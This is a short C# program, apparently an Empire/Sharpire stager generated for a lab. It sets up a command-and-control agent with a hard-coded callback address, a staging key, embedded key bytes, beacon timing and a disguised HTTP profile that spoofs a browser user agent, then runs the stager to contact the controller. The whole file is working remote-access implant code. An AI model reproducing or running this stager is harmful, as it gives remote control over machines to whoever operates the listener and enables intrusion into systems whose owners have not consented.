using System;
using Sharpire;

public static class Program
{
    public static void Main()
    {
        try
        {
            string profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            string address = "http://172.20.10.3:80";
            string stagingkey = "vCBRYnq9srTlIYRry2L3twFvcJcKKYBc";
            string workinghours = "";
            string killdate = "";
            uint delay = 5;
            double jitter = 0;
            uint lostlimit = 10;
            string agentlanguage = "dotnet";
            string[] arguments = {address, stagingkey, agentlanguage};
            string defaultResponse = "";
            byte[] skbytes = new byte[] { 0x7B, 0xB2, 0xEE, 0xEE, 0xE4, 0xDC, 0x28, 0x55, 0x32, 0x05, 0xFC, 0xF4, 0x3F, 0xEC, 0x80, 0x16, 0xA4, 0xD7, 0x62, 0xF5, 0x8F, 0xDA, 0x4C, 0x93, 0x8F, 0x74, 0x7A, 0x13, 0x2E, 0xF3, 0x0B, 0x57 };
            byte[] pk = new byte[] { 0x52, 0x1A, 0x6E, 0xA8, 0xEB, 0xD4, 0xC0, 0xC5, 0x14, 0x22, 0x91, 0x05, 0xA5, 0xD1, 0x89, 0x8E, 0x31, 0xFC, 0x37, 0x37, 0xB0, 0xD7, 0x0B, 0xF1, 0xA8, 0x83, 0x9B, 0xB6, 0xE8, 0x1C, 0xE6, 0x94 };
            
            SessionInfo sessionInfo = new SessionInfo(arguments);
            sessionInfo.SetWorkingHours(workinghours);
            sessionInfo.SetKillDate(killdate);
            sessionInfo.SetDefaultJitter(jitter);
            sessionInfo.SetDefaultDelay(delay);
            sessionInfo.SetDefaultLostLimit(lostlimit);
            sessionInfo.SetDefaultResponse(defaultResponse);
            sessionInfo.SetProfile(profile);
            sessionInfo.SetPrivateKeyBytes(skbytes);
            sessionInfo.SetPublicKeyBytes(pk);


            (new EmpireStager(sessionInfo)).Execute();
        }
        catch (Exception e) { Console.WriteLine( e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace); }
    }
}